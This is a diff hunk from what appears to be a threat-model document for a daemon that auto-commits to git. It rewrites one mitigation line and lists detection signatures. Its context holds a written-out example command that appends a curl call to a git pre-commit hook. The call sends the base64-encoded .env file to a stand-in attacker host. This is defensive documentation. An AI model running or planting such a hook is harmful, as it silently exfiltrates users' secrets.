@@ -95,7 +95,7 @@ pip install shadow313[full]  # if PyPI package is compromised
 echo 'curl attacker.com/$(cat .env | base64)' >> .git/hooks/pre-commit
 ```
 **Detection:** NEXUS-SIG-013 (file modification), eBPF execve hook
-**Mitigation:** Daemon doesn't run git hooks — only `git add/commit`
+**Mitigation:** Git auto-commit is disabled by default. If explicitly enabled, it is restricted to feature branches, runs the secret scanner, and preserves normal Git hooks.
 
 **Vector 3: Daemon binary replacement**
 ```bash
